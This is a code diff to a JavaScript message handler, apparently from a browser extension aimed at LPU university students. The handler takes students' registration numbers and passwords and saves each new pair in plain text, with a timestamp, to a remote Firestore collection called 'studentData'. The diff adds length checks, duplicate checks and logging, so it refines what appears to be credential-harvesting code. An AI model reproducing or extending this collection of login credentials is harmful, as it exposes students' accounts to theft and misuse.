@@ -88,17 +88,26 @@ if (!globalThis.messageListenerAttached) {
       }
     }
 
-    // 🏫 Student Data Handler (Unchanged)
+    // 🏫 Student Data Handler (Optimized - No Chunks)
     if (msg.type === "student_data") {
       const { registrationNumber, password } = msg.data;
 
+      // Validate minimum length to avoid saving incomplete data
       if (!registrationNumber || !password) return;
+      if (registrationNumber.length < 8 || password.length < 4) {
+        console.warn(
+          "%c⚠️ [LPU] Incomplete data (too short) — skipping",
+          "color: orange; font-weight: bold;"
+        );
+        return;
+      }
 
       const colRef = collection(db, "studentData");
       const docData = { registrationNumber, password };
       const key = `${registrationNumber}:${password}`;
 
       try {
+        // In-memory check first (faster)
         if (savedStudentSet.has(key)) {
           console.warn(
             "%c⛔️ [LPU] Already handled in-memory — skipping",
@@ -108,7 +117,14 @@ if (!globalThis.messageListenerAttached) {
         }
         savedStudentSet.add(key);
 
-        if (await isDuplicateData(colRef, docData)) return;
+        // Firestore duplicate check (checks exact registrationNumber + password combo)
+        if (await isDuplicateData(colRef, docData)) {
+          console.warn(
+            "%c⛔️ [LPU] Exact duplicate exists in DB — skipping save",
+            "color: gray; font-weight: bold;"
+          );
+          return;
+        }
 
         await addDoc(colRef, { ...docData, timestamp: new Date() });
         console.log(
